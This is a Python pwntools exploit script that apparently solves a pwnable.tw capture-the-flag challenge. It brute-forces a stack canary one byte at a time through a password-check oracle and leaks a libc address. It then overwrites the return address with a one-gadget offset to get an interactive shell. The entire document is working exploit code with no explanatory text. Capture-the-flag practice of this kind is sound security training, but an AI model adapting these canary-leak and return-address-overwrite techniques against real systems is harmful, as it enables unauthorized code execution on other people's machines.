from pwn import *

addr = "chall.pwnable.tw"
port = 10205

s = remote(addr, port)

def leak(leakdata, length):
    leakdata_len = len(leakdata)
    for i in range(0, length):
        for j in range(0x01, 0xff):
            s.recvuntil(">> ")
            s.send("1")
            s.recvuntil("Your passowrd :")
            s.send(leakdata+chr(j)+"\x00")
            data = s.recvuntil(" !")
            print "i : %d, j : %x" % (i,j)
            if "Success" in data:
                log.info(data + " i : %d" % i)
                leakdata += chr(j)
                log.info(repr(leakdata))
               
                setFlagZero()
                break
    return leakdata[leakdata_len:]

def compare(_password):
    sleep(0.3)
    print s.recvuntil(">> ")
    s.send("1")

    sleep(0.3)
    print s.recvuntil("Your passowrd :")
    s.send(_password)
    
    sleep(0.3)
    print s.recvuntil("Login Success !")

def setFlagZero():
    sleep(0.3)
    print s.recvuntil(">> ")
    s.send("1")
    
def magic_copy(_buf,_setFlag = True):
    sleep(0.3)
    print s.recvuntil(">> ")
    s.send("3")

    sleep(0.3)
    print s.recvuntil("Copy :")
    s.send(_buf)

    sleep(0.3)
    print s.recvuntil("It is magic copy !")

    if _setFlag == True:
        setFlagZero()



canary = leak("", 16)
log.info("canary : %x %x" % (u64(canary[:8]), u64(canary[8:])))

compare("\x00"+"1"*(63+16))

magic_copy("1")

stdout_libc = u64("\x20" + leak("1"*(16), 6)[1:] + "\x00\x00")
system_libc = stdout_libc - 0x37f290
one_shot = system_libc - 0x17a

log.info("stdout_libc : %x" % stdout_libc)
log.info("system_libc : %x" % system_libc)
log.info("one_shot : %x" % one_shot)

compare("\x00"+"1"*63+canary+"1"*16+"A"*8+p64(one_shot))
magic_copy("1", False)

s.send("2")

s.interactive()
s.close()
